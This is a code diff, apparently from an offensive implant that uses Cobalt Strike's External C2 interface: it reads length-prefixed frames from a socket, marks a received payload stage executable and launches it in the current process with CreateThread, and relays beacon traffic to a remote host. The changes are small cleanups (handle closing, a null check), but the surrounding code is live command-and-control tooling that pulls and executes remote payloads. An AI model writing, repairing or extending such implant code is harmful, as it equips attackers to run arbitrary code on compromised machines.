@@ -61,15 +61,14 @@ DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
 
 /* receive a frame from a socket */
 DWORD recv_frame(SOCKET my_socket, char* buffer, DWORD max) {
-	DWORD size = 0, total = 0, temp = 0;
+	DWORD size = 0, total = 0;
 
 	/* read the 4-byte length */
 	recv(my_socket, (char*)&size, 4, 0);
 
 	/* read in the result */
 	while (total < size) {
-		temp = recv(my_socket, buffer + total, size - total, 0);
-		total += temp;
+		total += recv(my_socket, buffer + total, size - total, 0);
 	}
 
 	return size;
@@ -105,10 +104,12 @@ BOOL MgPayload(SOCKET socket_extc2) {
 	}
 	VirtualProtect(payload, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
 	// Inject the payload stage into the current process
-	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL) == NULL) {
+	HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);
+	if (thread == NULL) {
 		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to CreateThread");
 		return FALSE;
 	}
+	CloseHandle(thread);
 	return TRUE;
 }
 
@@ -185,7 +186,8 @@ BOOL csExternalC2(WCHAR* host, DWORD port) {
 			free(buffer);
 		}
 		// close our handles
-		CloseHandle(handle_beacon);
+		if(handle_beacon != NULL)
+			CloseHandle(handle_beacon);
 		closesocket(socket_extc2);
 		Sleep(5 * SECOND);
 	}
